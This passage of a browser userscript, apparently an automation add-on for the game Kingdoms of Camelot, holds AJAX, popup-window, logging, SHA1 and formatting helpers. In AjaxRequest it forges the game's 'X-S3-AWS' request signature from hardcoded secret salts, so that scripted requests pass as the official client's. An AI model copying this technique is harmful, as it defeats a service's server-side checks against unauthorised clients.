    if (DEBUG_TRACE_AJAX > 0){
      WinLog.writeText ("AJAX SUCCESS:");  
      if (DEBUG_TRACE_AJAX > 1)
        WinLog.writeText (inspect (r, 2, 1));
      if (DEBUG_TRACE_AJAX > 2)
        WinLog.writeText (inspect (JSON2.parse(r.responseText), 8, 1));  
    }
    if (r.status == 200)
      callback ({ok:true, dat:JSON2.parse(r.responseText)});
    else
      error (r.status, 'Server error: '+ r.statusText);
  }
  function myFailure (r){
    if (DEBUG_TRACE_AJAX > 0)
      WinLog.writeText ("**********  AJAX FAILURE: \n" + inspect (r, 8, 1));  
    error (r.status, r.statusText +' ('+ r.status +')');
  }
  function error (code, msg){
    if (!code || (code>=400 && code<500)){      // SHOULD BE 500!
      cancel();
      return;
    }
    retrySecs *= 1.5;
    new DialogRetry (msg, retrySecs, retry, cancel);
    function retry (){
      new MyAjaxRequest (url, params, callback, isPost);
    }
    function cancel(){
      callback ({ok:false, errmsg:msg});
    }
  }
}



// simliar to protoype's Ajax.Request ... 
// passes object to handlers: {status:, responseText:, statusText:, ajax:}
function AjaxRequest (url, opts){
  var timer = null;
  var method = 'GET';
  var ajax;
  if (IsChrome) {
	  var headers = {
		'Accept': '*/*'
	  };
  } else {
	  var headers = {
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
	  };
  }
  if (window.XMLHttpRequest)
    ajax=new XMLHttpRequest();
  else
    ajax=new ActiveXObject("Microsoft.XMLHTTP");
  if (opts.method)
    method = opts.method.toUpperCase();
  if (method == 'POST'){
    headers['content-type'] = 'application/x-www-form-urlencoded';
  } 
  else if (method == 'GET'){
    url = addUrlArgs (url, opts.parameters);
  }

  ajax.onreadystatechange = function(){
//  ['Uninitialized', 'Loading', 'Loaded', 'Interactive', 'Complete']; states 0-4
    if (ajax.readyState==4) {
      clearTimeout (timer);  
      if (ajax.status >= 200 && ajax.status < 399){
        if (opts.onSuccess) opts.onSuccess({responseText:ajax.responseText, status:ajax.status, statusText:"OK", ajax:ajax});
      }else{
        if (opts.onFailure) opts.onFailure({responseText:ajax.responseText, status:ajax.status, statusText:ajax.statusText, ajax:ajax});
      }
    } else {
      if (opts.onChange) opts.onChange ({responseText:ajax.responseText, status:ajax.status, statusText:ajax.statusText, ajax:ajax});
    }
  }  
  ajax.open(method, url, true);   // always async!
  for (var k in headers)
    ajax.setRequestHeader (k, headers[k]);
  if (matTypeof(opts.requestHeaders)=='object')
    for (var k in opts.requestHeaders)
      ajax.setRequestHeader (k, opts.requestHeaders[k]);
  if (opts.timeoutSecs)
    timer = setTimeout (timedOut, opts.timeoutSecs*1000);
  if (method == 'POST'){
    var a = [];
    for (var k in opts.parameters)
      a.push (k +'='+ opts.parameters[k] );
    var parmStr = a.join ('&');  
    //ajax.setRequestHeader ('x-s3-aws', SHA1("playerId" + url + parmStr + "WaterDragon5555"));
	ajax.setRequestHeader ('X-S3-AWS', SHA1("Dracunculiasis" + parmStr + "LandCrocodile" + url  + "Bevar-Asp"));
    ajax.send (parmStr);
  } else {
    ajax.send();
  }
  
  function timedOut(){
    ajax.abort();
    if (opts.onFailure) opts.onFailure({responseText:null, status:599, statusText:'Timed Out', ajax:ajax});
  }
}   



// example: http://www150.kingdomsofcamelot.com
var ServerId = null;
function getServerId() {
  if (ServerId)
    return ServerId;
  var m=/^realm([0-9]+)\./.exec(document.location.hostname);
  if(m){
    ServerId = m[1];
    return m[1];
  }
  return '';
}

function logit (msg){
  var serverID = getServerId();
  var now = new Date();
  if (IsChrome)
    console.log (msg);
  else
    GM_log (serverID +' @ '+ now.toTimeString().substring (0,8) +'.' + now.getMilliseconds() +': '+  msg);
}

/*********************************** Log Tab ***********************************/
Tabs.ActionLog = {
  tabOrder: LOG_TAB_ORDER,
  tabLabel : gLog,
  myDiv : null,
  logTab : null,
  maxEntries: 500,
  saveEntries: 200,
  state : null,
    
  init : function (div){
    var t = Tabs.ActionLog;
    t.myDiv = div;
    t.myDiv.innerHTML = '<DIV class=pbTitle>'+translate('ACTION LOG')+'</div><DIV style="height:725px; max-height:725px; overflow-y:auto">\
      <TABLE cellpadding=0 cellspacing=0 id=pbactionlog class=pbTabLined><TR><TD></td><TD width=95%></td></table></div>';
    t.logTab = document.getElementById('pbactionlog');  
    t.state = 1;
    if (matTypeof(Data.log) == 'array'){
      for (var i=0; i<Data.log.length; i++)
        t._addTab (Data.log[i].msg, Data.log[i].ts);
    }
  },

  hide : function (){
  },

  show : function (){
  },

  _addTab : function (msg, ts){
    var t = Tabs.ActionLog;
    if (t.state != 1)
      return;
    if (t.logTab.rows.length >= t.maxEntries)
      t.logTab.deleteRow(t.maxEntries-1);
    var row = t.logTab.insertRow(0);
    row.vAlign = 'top';
    row.insertCell(0).innerHTML = ts;
    row.insertCell(1).innerHTML = msg;
  }, 
  
  log : function (msg){
    var t = Tabs.ActionLog;
    var ts = new Date().toTimeString().substring (0,8);
    t._addTab (msg, ts);
    while (Data.log.length >= t.saveEntries)
      Data.log.shift();
    Data.log.push ({msg:msg, ts:ts});
  },
}

function actionLog (msg){
  if (!Tabs.ActionLog.tabDisabled)
    Tabs.ActionLog.log (msg);  
}
    

function AddMainTabLink(text, eventListener, mouseListener) {
  var ul = searchDOM (document.getElementById('ft'), 'node.tagName=="UL"', 4);
  var li = document.createElement ('li');
  var a = document.createElement ('a');
  li.className = 'tab first';
  a.innerHTML = text;
  a.href='javascript:';
  a.addEventListener ('click', eventListener, true);
  a.className = 'toolbuttOff';
  li.appendChild (a);
  WinTracker.setBlinkElement (a);
  ul.insertBefore (li, ul.firstChild);
  if (mouseListener != null)
    a.addEventListener('mousedown', mouseListener, true);
  return a;
}

/**********************************************************************************/

function titleLine (msg){
  return '<TABLE cellpadding=0 cellspacing=0 width=100%><TR><TD width=50%><HR></td><TD>'+ msg +'</td><TD width=50%><HR></td></tr></table>';
}

/************  LIB classes/functions .... **************/
function getAbsoluteOffsets (e){
  ret = {left:0, top:0};
  while (e.offsetParent){
    if (e.style.position == 'absolute')
      break;
    ret.left += e.offsetLeft;
    ret.top += e.offsetTop;
    e = e.offsetParent;
  }      
  return ret;  
}

DebugTimer = {
  startTime : 0,
  start : function (){
    now = new Date();
    DebugTimer.startTime = now.getTime();
  },
  display : function (label, noReset){
    now = new Date();
    elapsed = now.getTime() - DebugTimer.startTime;
    logit (label +": "+ elapsed/1000);
    if (noReset===null || !noReset)
      DebugTimer.startTime = now.getTime();
  },
};

function debugPos  (e){
  return 'client - offset: '+ e.clientLeft +','+ e.clientTop +','+ e.clientWidth +','+ e.clientHeight
          +' - '+ e.offsetLeft +','+ e.offsetTop +','+ e.offsetWidth +','+ e.offsetHeight +' '+ e +' --OP--> '+ e.offsetParent;
}

function searchDOM (node, condition, maxLevel, doMult){
  var found = [];
  eval ('var compFunc = function (node) { return ('+ condition +') }');
  doOne(node, 1);
  if(!doMult){
    if (found.length==0)
      return null;
    return found[0];
  }
  return found;
  function doOne (node, curLevel){
    try {
      if (compFunc(node))
        found.push(node);
    } catch (e){
    }      
    if (!doMult && found.length>0)
      return; 
    if (++curLevel<maxLevel && node.childNodes!=undefined)
      for (var c=0; c<node.childNodes.length; c++)
        doOne (node.childNodes[c], curLevel);
  }
}

function getClientCoords(e){
  if (e==null)
    return {x:null, y:null, width:null, height:null};
  var x=0, y=0;
  ret = {x:0, y:0, width:e.clientWidth, height:e.clientHeight};
  while (e.offsetParent != null){
    ret.x += e.offsetLeft;
    ret.y += e.offsetTop;
    e = e.offsetParent;
  }
  return ret;
}

function htmlTitleLine (msg){
  return '<TABLE width=100% cellspacing=0><TR><TD style="padding:0px" width=50%><HR></td><TD style="padding:0px">[ '+ msg +' ]</td><TD style="padding:0px" width=50%><HR></td></tr></table>';  
}


var WinManager = {
  wins : {},    // prefix : CPopuppa obj

  get : function (prefix){
    var t = WinManager;
    return t.wins[prefix];
  },
  
  add : function (prefix, pop){
    var t = WinManager;
    t.wins[prefix] = pop;
//    if (unsafeWindow.CPopuppaWins == null)
//      unsafeWindow.CPopuppaWins = {};
//    unsafeWindow.CPopuppaWins[prefix] = pop;
  },
  
  delete : function (prefix){
    var t = WinManager;
    delete t.wins[prefix];
//    delete unsafeWindow.CPopuppaWins[prefix];
  }    
}


// creates a 'popup' div
// prefix must be a unique (short) name for the popup window
function CPopuppa (prefix, x, y, width, height, enableDrag, onClose) {
  var pop = WinManager.get(prefix);
  if (pop){
    pop.show (false);
    return pop;
  }
  this.BASE_ZINDEX = 11111;
                     
  // protos ...
  this.show = show;
  this.toggleHide = toggleHide;
  this.getTopDiv = getTopDiv;
  this.getMainDiv = getMainDiv;
  this.getLayer = getLayer;
  this.setLayer = setLayer;
  this.setEnableDrag = setEnableDrag;
  this.getLocation = getLocation;
  this.setLocation = setLocation;
  this.focusMe = focusMe;
  this.unfocusMe = unfocusMe;
  this.centerMe = centerMe;
  this.destroy = destroy;
  this.setModal = setModal;

  // object vars ...
  this.div = document.createElement('div');
  this.prefix = prefix;
  this.onClose = onClose;
  
  var t = this;
  this.div.className = 'CPopuppa '+ prefix +'_CPopuppa';
  this.div.id = prefix +'_otterz';
  this.div.style.background = "#5D902A";
  //this.div.style.zIndex = this.BASE_ZINDEX        // KOC modal is 100210 ?
  this.div.style.zIndex = 111
  this.div.style.display = 'none';
  this.div.style.width = width + 'px';
  this.div.style.height = height + 'px';
  this.div.style.position = "absolute";
  this.div.style.top = (y+2) +'px';
  this.div.style.left = (x+2) + 'px';
  
  if (CPopuppaTopClass==null)
    topClass = 'CPopuppaTop '+ prefix +'_CPopuppaTop';
  else
    topClass = CPopuppaTopClass +' '+ prefix +'_'+ CPopuppaTopClass;
    
  var m = '<TABLE cellspacing=0 width=100% height=100%><TR id="'+ prefix +'_bar" class="'+ topClass +'"><TD width=99% valign=bottom><SPAN id="'+ prefix +'_top"></span></td>\
      <TD id='+ prefix +'_X align=right valign=middle onmouseover="this.style.cursor=\'pointer\'" style="color:#fff; background:#333; font-weight:bold; font-size:14px; padding:0px 5px">X</td></tr>\
      <TR><TD height=100% valign=top class="CPopMain '+ prefix +'_CPopMain" colspan=2 id="'+ prefix +'_main"></td></tr></table>';
  document.body.appendChild(this.div);
  this.div.innerHTML = m;
  document.getElementById(prefix+'_X').addEventListener ('click', e_XClose, false);
  this.dragger = new CWinDrag (document.getElementById(prefix+'_bar'), this.div, enableDrag);
  
  this.div.addEventListener ('mousedown', e_divClicked, false);
  WinManager.add(prefix, this);
  
  function setModal (onOff){
  }
  
  function e_divClicked (){
    t.focusMe();
  }  
  function e_XClose (){
    t.show(false);
    if (t.onClose != null)
      t.onClose();
  }

  function focusMe (){
    t.setLayer(5);
//    for (k in unsafeWindow.CPopuppaWins){
//      if (k != t.prefix)
//        unsafeWindow.CPopuppaWins[k].unfocusMe(); 
//    }
  }
  function unfocusMe (){
    t.setLayer(-5);
  }
  function getLocation (){
    return {x: parseInt(this.div.style.left), y: parseInt(this.div.style.top)};
  }
  function setLocation (loc){
    t.div.style.left = loc.x +'px';
    t.div.style.top = loc.y +'px';
  }
  function destroy (){
    document.body.removeChild(t.div);
    WinManager.delete (t.prefix);
  }
  function centerMe (parent){
    if (parent == null){
      var coords = getClientCoords(document.body);
    } else
      var coords = getClientCoords(parent);
    var x = ((coords.width - parseInt(t.div.style.width)) / 2) + coords.x;
    var y = ((coords.height - parseInt(t.div.style.height)) / 2) + coords.y;
    if (x<0)
      x = 0;
    if (y<0)
      y = 0;
    t.div.style.left = x +'px';
    t.div.style.top = y +'px';
  }
  function setEnableDrag (tf){
    t.dragger.setEnable(tf);
    Data.options.ptWinDrag = tf;
    
  }
  function setLayer(zi){
    t.div.style.zIndex = ''+ (this.BASE_ZINDEX + zi);
  }
  function getLayer(){
    return parseInt(t.div.style.zIndex) - this.BASE_ZINDEX;
  }
  function getTopDiv(){
    return document.getElementById(this.prefix+'_top');
  }
  function getMainDiv(){
    return document.getElementById(this.prefix+'_main');
  }
  function show(tf){
    if (tf){
      t.div.style.display = 'block';
      t.focusMe ();
    } else {
      t.div.style.display = 'none';
    }
    return tf;
  }
  function toggleHide(t){
    if (t.div.style.display == 'block') {
      return t.show (false);
    } else {
      return t.show (true);
    }
  }
}

function CWinDrag (clickableElement, movingDiv, enabled) {
  var t=this;
  this.setEnable = setEnable;
  this.setBoundRect = setBoundRect;
  this.debug = debug;
  this.dispEvent = dispEvent;
  this.lastX = null;
  this.lastY = null;
  this.enabled = true;
  this.moving = false;
  this.theDiv = movingDiv;
  this.body = document.body;
  this.ce = clickableElement;
  this.moveHandler = new CeventMove(this).handler;
  this.outHandler = new CeventOut(this).handler;
  this.upHandler = new CeventUp(this).handler;
  this.downHandler = new CeventDown(this).handler;
  this.clickableRect = null;
  this.boundRect = null;
  this.bounds = null;
  this.bounds = null;
  this.enabled = false;
  if (enabled == null)
    enabled = true;
  this.setEnable (enabled);

  function setBoundRect (b){    // this rect (client coords) will not go outside of current body
    this.boundRect = boundRect;
    this.bounds = null;
  }

  function setEnable (enable){
    if (enable == t.enabled)
      return;
    if (enable){
      clickableElement.addEventListener('mousedown',  t.downHandler, false);
      t.body.addEventListener('mouseup', t.upHandler, false);
    } else {
      clickableElement.removeEventListener('mousedown', t.downHandler, false);
      t.body.removeEventListener('mouseup', t.upHandler, false);
    }
    t.enabled = enable;
  }

  function CeventDown (that){
    this.handler = handler;
    var t = that;
    function handler (me){
      if (t.bounds == null){
        t.clickableRect = getClientCoords(clickableElement);
        t.bodyRect = getClientCoords(document.body);
        if (t.boundRect == null)
          t.boundRect = t.clickableRect;
        t.bounds = {top:10-t.clickableRect.height, bot:t.bodyRect.height-25, left:40-t.clickableRect.width, right:t.bodyRect.width-25};
      }
      if (me.button==0 && t.enabled){
        t.body.addEventListener('mousemove', t.moveHandler, true);
        t.body.addEventListener('mouseout', t.outHandler, true);
        t.lastX = me.clientX;
        t.lastY = me.clientY;
        t.moving = true;
      }
    }
  }

  function CeventUp  (that){
    this.handler = handler;
    var t = that;
    function handler (me){
      if (me.button==0 && t.moving)
        _doneMoving(t);
    }
  }

  function _doneMoving (t){
    t.body.removeEventListener('mousemove', t.moveHandler, true);
    t.body.removeEventListener('mouseout', t.outHandler, true);
    t.moving = false;
  }

  function CeventOut  (that){
    this.handler = handler;
    var t = that;
    function handler (me){
//t.dispEvent ('eventOUT', me);
      if (me.button==0){
        t.moveHandler (me);
      }
    }
  }

  function CeventMove (that){
    this.handler = handler;
    var t = that;
    function handler (me){
      if (t.enabled && !t.wentOut){
//t.dispEvent ('eventMOVE', me);
        var newTop = parseInt(t.theDiv.style.top) + me.clientY - t.lastY;
        var newLeft = parseInt(t.theDiv.style.left) + me.clientX - t.lastX;
        if (newTop < t.bounds.top){     // if out-of-bounds...
          newTop = t.bounds.top;
          _doneMoving(t);
        } else if (newLeft < t.bounds.left){
          newLeft = t.bounds.left;
          _doneMoving(t);
        } else if (newLeft > t.bounds.right){
          newLeft = t.bounds.right;
          _doneMoving(t);
        } else if (newTop > t.bounds.bot){
          newTop = t.bounds.bot;
          _doneMoving(t);
        }
        t.theDiv.style.top = newTop + 'px';
        t.theDiv.style.left = newLeft + 'px';
        t.lastX = me.clientX;
        t.lastY = me.clientY;
      }
    }
  }

  function debug  (msg, e){
    logit ("*************** "+ msg +" ****************");
    logit ('clientWidth, Height: '+ e.clientWidth +','+ e.clientHeight);
    logit ('offsetLeft, Top, Width, Height (parent): '+ e.offsetLeft +','+ e.offsetTop +','+ e.offsetWidth +','+ e.offsetHeight +' ('+ e.offsetParent +')');
    logit ('scrollLeft, Top, Width, Height: '+ e.scrollLeft +','+ e.scrollTop +','+ e.scrollWidth +','+ e.scrollHeight);
  }

  function dispEvent (msg, me){
    logit (msg + ' Button:'+ me.button +' Screen:'+ me.screenX +','+ me.screenY +' client:'+  me.clientX +','+ me.clientY +' rTarget: '+ me.relatedTarget);
  }
}

function inspect(obj, maxLevels, level, doFunctions){
  var str = '', type, msg;
  if(level == null)  level = 0;
  if(maxLevels == null) maxLevels = 1;
  if(maxLevels < 1)
      return 'Inspect Error: Levels number must be > 0';
  if(obj == null)
    return 'ERROR: Object is NULL\n';
  var indent = '';
  for (var i=0; i<level; i++)
    indent += '  ';
  for(property in obj) {
    try {
        type =  matTypeof(obj[property]);
        if (doFunctions==true && (type == 'function')){
          str += indent + '(' + type + ') ' + property + "[FUNCTION]\n";
        } else if (type != 'function') {
          str += indent + '(' + type + ') ' + property + ( (obj[property]==null)?(': null'):('')) +' = '+ obj[property] +"\n";
        }
        if((type=='object' || type=='array') && (obj[property] != null) && (level+1 < maxLevels))
          str += inspect(obj[property], maxLevels, level+1, doFunctions);  // recurse
    }
    catch(err) {
      // Is there some properties in obj we can't access? Print it red.
      if(typeof(err) == 'string') msg = err;
      else if(err.message)        msg = err.message;
      else if(err.description)    msg = err.description;
      else                        msg = 'Unknown';
      str += '(Error) ' + property + ': ' + msg +"\n";
    }
  }
  str += "\n";
  return str;
}

Array.prototype.compare = function(testArr) {
    if (this.length != testArr.length) return false;
    for (var i = 0; i < testArr.length; i++) {
        if (this[i].compare) { 
            if (!this[i].compare(testArr[i])) return false;
        }
        if (this[i] !== testArr[i]) return false;
    }
    return true;
}
String.prototype.entityTrans = { '&':'&', '<':'<',  '>':'>',  '\"':'"' };
String.prototype.htmlEntities = function() {
  var ret = this.toString();
  for (k in this.entityTrans)
     ret  = ret.split(k).join(this.entityTrans[k]);
  return ret;
}

String.prototype.stripTags = function(){ 
  return this.replace(/<\w+(\s+("[^"]*"|'[^']*'|[^>])+)?>|<\/\w+>/gi, '');
}

String.prototype.capitalize = function(){ 
  return this.charAt(0).toUpperCase() + this.substring(1).toLowerCase();
}

if (String.trim == undefined) {
  String.prototype.trim = function () {
      return this.replace(/^\s*/, "").replace(/\s*$/, "");
  }
}
function entityDecode (str){
  var ta=document.createElement('textarea');
  ta.innerHTML = str; 
  return ta.value;
}  
  
function parseNvQuoted(str){
  var ret = {};
  var re = /\s*(.*?)\s*=\s*('|")(.*?)\2/gi;
  while ((m = re.exec(str)) != null)
    ret[m[1]] = m[3];
  return ret;
}

function objectName (o){
  var s = o.toString();
  return s.substr(7,s.length-8);
}

function matTypeof (v){
  if (v == undefined)
    return 'undefined';
  if (typeof (v) == 'object'){
    if (!v)
      return 'null';
    else if (v.constructor.toString().indexOf("Array")>=0 && typeof(v.splice)=='function')
      return 'array';
    else return 'object';
  }
  return typeof (v);
}

function addCommasInt(n){
  nStr = parseInt(n) + '';
  var rgx = /(\d+)(\d{3})/;
  while (rgx.test(nStr)) {
    nStr = nStr.replace(rgx, '$1' + ',' + '$2');
  }
  return nStr;
}

function addCommas(nStr){
  nStr += '';
  x = nStr.split('.');
  x1 = x[0];
  x2 = x.length > 1 ? '.' + x[1] : '';
  var rgx = /(\d+)(\d{3})/;
  while (rgx.test(x1)) {
    x1 = x1.replace(rgx, '$1' + ',' + '$2');
  }
  return x1 + x2;
}


function htmlSelector (valNameObj, curVal, tags){
  m = [];
  m.push ('<SELECT');
  if (tags){
    m.push (' ');
    m.push (tags);
  }  
  for (k in valNameObj){
    m.push ('><OPTION ');
    if (k == curVal)
      m.push ('SELECTED ');
    m.push ('value="');
    m.push (k);
    m.push ('">');
    m.push (valNameObj[k]);
    m.push ('</option>');
  }
  m.push ('</select>');
  return m.join ('');

}


function serverTime (){
  return parseInt (new Date().getTime() / 1000) + Seed.serverTimeOffset;
}
function htmlOptions (a, curVal){
  m = '';
  for (k in a)
    m += '<OPTION value="'+ k +'"'+ (k==curVal?' SELECTED':'')  +'>'+ a[k] +'</option>';
  return m;
}
function getFunctionName (func){
  var name=/\W*function\s+([\w\$]+)\(/.exec(func);
  if (!name)
    return '';
  return name[1];
}

function findAllBetween (txt, find1, find2){
  var m = [];
  var last = 0;
  while ( (i1=txt.indexOf(find1, last))>=0 && (i2=txt.indexOf (find2, i1))>=0 ) {
    m.push (txt.substring(i1+find1.length, i2));
    last = i2 + find2.length;
  }
  return m;
}

function strUpTo (s, find){
  var i = s.indexOf(find);
  if (i > 0)
    return s.substr(0, i);
  return s;
}


/********
 Xd Xh
 Xh Xm
 Xm Xs
 Xs
********/
function timestrShort(time) {
  time = parseInt (time);
  if (time > 86400){
    var m = [];
    time /= 3600;
    m.push (parseInt(time/24)); 
    m.push (translate('d')+' ');
    m.push (parseInt(time%24)); 
    m.push (translate('h'));
    return m.join ('');    
  } else
    return timestr (time);
}

/**********************
 part       full
 Xd Xh Xm   Xd Xh Xm Xs
 Xh Xm      Xh Xm Xs
 Xm Xs      Xm Xs
 Xs         Xs
**********************/
function timestr(time, full) {
  time = parseInt (time);
  var m = [];
  var t = time;
  if (t < 61)
    return  t + translate( 's' );
  if (t > 86400){
    m.push (parseInt(t/86400)); 
    m.push (translate('d')+' ');
    t %= 86400;
  }  
  if (t>3600 || time>3600){
    m.push (parseInt(t/3600)); 
    m.push (translate('h')+' ');
    t %= 3600;
  }  
  m.push (parseInt(t/60)); 
  m.push (translate('m'));
  if (full || time<=3600 ){
    m.push (' ');
    m.push (t%60);
    m.push (translate('s'));  
  }
  var str = m.join('');
  if (str[str.length-1] == ' ')
    str = str.substring(0, str.length-1);
  return str;
}

/************  LIB singletons .... **************/
var WINLOG_MAX_ENTRIES = 1000;     // TODO
var WinLog = {
  state : null,
  win: null,
  eOut : null,
  lastE : null,
  enabled : true,
  reverse : true,
  busy : false,
isOpening : false,
  lineNum : 0,

  open : function (){
    var t = WinLog;

    function eventButClear(){
      var t = WinLog;
      t.lastE = null;
      t.eOut.innerHTML ='';
      t.lineNum = 0;
    }
    function eventButReverse(){
      var t = WinLog;
      if (t.busy)
        return;
      t.busy = true;
      if (t.reverse){
        t.win.document.getElementById('wlRev').value= 'Top';
        t.reverse = false;
      } else{
        t.win.document.getElementById('wlRev').value= 'Bottom';
        t.reverse = true;
      }
      var n = t.eOut.childNodes.length;
      if (n < 2)
        return;
      for (i=n-2; i>=0; i--){
        t.eOut.appendChild (t.eOut.childNodes[i]);
      }
      t.busy = false;
    }
    
    if (!t.win || t.win.closed){
t.isOpening = true;  
// Firefox bug??? It appears as if a new thread is started on open, withOUT reusing same window
      t.win = window.open('', 'uwtrace', 'top=30,left=0,width=900,height=700,scrollbars=Yok,location=Yok,menubar=Yok,directories=Yok,status=Yok');
t.isOpening = false; 
t.state = null; 
    }
    
    if (t.state == null){
      t.win.document.body.innerHTML = '<STYLE>pre{margin:0px} hr{margin:3px; height:1px; border:0px; z-index=111; left=700; color:#cee; background-color:#cee}</style>\
        <BODY style="margin:0px; padding:0px; border:none">\
        <DIV id=winlogtop style="background-color:#d0d0d0; margin:0px; padding:0px; border:1px solid">\
        <INPUT id=wlClear type=submit value="Clear">    <INPUT id=wlRev type=submit value="Bottom"></div>\
        <DIV id=wlOut style="overflow-y:auto; height:100%; max-height:100%"></div></body>';
      t.win.document.getElementById('wlClear').addEventListener('click', eventButClear, false);
      t.win.document.getElementById('wlRev').addEventListener('click', eventButReverse, false);
      t.eOut =  t.win.document.getElementById('wlOut');
      t.lastE = null;
      t.state = 1;
    }
  },

  
  writeText : function (msg){
    WinLog.write (msg.htmlEntities()); 
  },
  
  write : function (msg){
    var t = WinLog;
    if (!t.enabled || t.isOpening)
      return;
    t.open();
    var te = document.createElement('pre');
    if (++t.lineNum % 2)    
      te.style.backgroundColor = '#eeeeee'; 
    else
      te.style.backgroundColor = '#ffffff'; 
    var now = new Date();
    var m = [];
    var millis = now.getMilliseconds();
    m.push (now.toTimeString().substring (0,8));
    m.push ('.');
    if (millis<100)
      m.push('0');
    if (millis<10)
      m.push('0');
    m.push(millis);
    m.push (': ');
    m.push (msg);
    te.innerHTML = m.join('');

    if (t.reverse){
      if (t.lastE == null){
        t.eOut.appendChild(te);
        t.lastE = te;
      } else {
        t.eOut.insertBefore(te, t.lastE);
      }
      var hr = document.createElement('hr');
      t.eOut.insertBefore(hr, te);
      t.lastE = hr;
    } else {
      t.eOut.appendChild(te);
      t.eOut.appendChild(document.createElement('hr'));
    }
  },
};


function SHA1 (msg) {
 
    function rotate_left(n,s) {
        var t4 = ( n<<s ) | (n>>>(32-s));
        return t4;
    };
 
    function lsb_hex(val) {
        var str="";
        var i;
        var vh;
        var vl;
        for( i=0; i<=6; i+=2 ) {
            vh = (val>>>(i*4+4))&0x0f;
            vl = (val>>>(i*4))&0x0f;
            str += vh.toString(16) + vl.toString(16);
        }
        return str;
    };
 
    function cvt_hex(val) {
        var str="";
        var i;
        var v;
        for( i=7; i>=0; i-- ) {
            v = (val>>>(i*4))&0x0f;
            str += v.toString(16);
        }
        return str;
    };
 
    function Utf8Encode(string) {
        string = string.replace(/\r\n/g,"\n");
        var utftext = "";
        for (var n = 0; n < string.length; n++) {
            var c = string.charCodeAt(n);
            if (c < 128) {
                utftext += String.fromCharCode(c);
            }
            else if((c > 127) && (c < 2048)) {
                utftext += String.fromCharCode((c >> 6) | 192);
                utftext += String.fromCharCode((c & 63) | 128);
            }
            else {
                utftext += String.fromCharCode((c >> 12) | 224);
                utftext += String.fromCharCode(((c >> 6) & 63) | 128);
                utftext += String.fromCharCode((c & 63) | 128);
            }
        }
        return utftext;
    };
 
    var blockstart;
    var i, j;
    var W = new Array(80);
    var H0 = 0x67452301;
    var H1 = 0xEFCDAB89;
    var H2 = 0x98BADCFE;
    var H3 = 0x10325476;
    var H4 = 0xC3D2E1F0;
    var A, B, C, D, E;
    var temp;
    msg = Utf8Encode(msg);
    var msg_len = msg.length;
    var word_array = new Array();
    for( i=0; i<msg_len-3; i+=4 ) {
        j = msg.charCodeAt(i)<<24 | msg.charCodeAt(i+1)<<16 |
        msg.charCodeAt(i+2)<<8 | msg.charCodeAt(i+3);
        word_array.push( j );
    }
    switch( msg_len % 4 ) {
        case 0:
            i = 0x080000000;
        break;
        case 1:
            i = msg.charCodeAt(msg_len-1)<<24 | 0x0800000;
        break;
 
        case 2:
            i = msg.charCodeAt(msg_len-2)<<24 | msg.charCodeAt(msg_len-1)<<16 | 0x08000;
        break;
 
        case 3:
            i = msg.charCodeAt(msg_len-3)<<24 | msg.charCodeAt(msg_len-2)<<16 | msg.charCodeAt(msg_len-1)<<8    | 0x80;
        break;
    }
    word_array.push( i );
    while( (word_array.length % 16) != 14 ) word_array.push( 0 );
    word_array.push( msg_len>>>29 );
    word_array.push( (msg_len<<3)&0x0ffffffff );
    for ( blockstart=0; blockstart<word_array.length; blockstart+=16 ) {
        for( i=0; i<16; i++ ) W[i] = word_array[blockstart+i];
        for( i=16; i<=79; i++ ) W[i] = rotate_left(W[i-3] ^ W[i-8] ^ W[i-14] ^ W[i-16], 1);
        A = H0;
        B = H1;
        C = H2;
        D = H3;
        E = H4;
        for( i= 0; i<=19; i++ ) {
            temp = (rotate_left(A,5) + ((B&C) | (~B&D)) + E + W[i] + 0x5A827999) & 0x0ffffffff;
            E = D;
            D = C;
            C = rotate_left(B,30);
            B = A;
            A = temp;
        }
        for( i=20; i<=39; i++ ) {
            temp = (rotate_left(A,5) + (B ^ C ^ D) + E + W[i] + 0x6ED9EBA1) & 0x0ffffffff;
            E = D;
            D = C;
            C = rotate_left(B,30);
            B = A;
            A = temp;
        }
        for( i=40; i<=59; i++ ) {
            temp = (rotate_left(A,5) + ((B&C) | (B&D) | (C&D)) + E + W[i] + 0x8F1BBCDC) & 0x0ffffffff;
            E = D;
            D = C;
            C = rotate_left(B,30);
            B = A;
            A = temp;
        }
        for( i=60; i<=79; i++ ) {
            temp = (rotate_left(A,5) + (B ^ C ^ D) + E + W[i] + 0xCA62C1D6) & 0x0ffffffff;
            E = D;
            D = C;
            C = rotate_left(B,30);
            B = A;
            A = temp;
        }
        H0 = (H0 + A) & 0x0ffffffff;
        H1 = (H1 + B) & 0x0ffffffff;
        H2 = (H2 + C) & 0x0ffffffff;
        H3 = (H3 + D) & 0x0ffffffff;
        H4 = (H4 + E) & 0x0ffffffff;
    }
    var temp = cvt_hex(H0) + cvt_hex(H1) + cvt_hex(H2) + cvt_hex(H3) + cvt_hex(H4);
    return temp.toLowerCase();
}

function translate( wordToTranslate ) {
    var returnWord = wordToTranslate
    if ( navigator.language == 'it' || navigator.language == 'it-it' || navigator.language == 'Italiano  [it]') {
        if ( translateITArray[wordToTranslate] != undefined ) {
            returnWord = translateITArray[wordToTranslate];
        }
        else {
            logit( wordToTranslate+' tradurre' )
        }
    }
    return returnWord;
}

setTimeout (dtStartup, 0);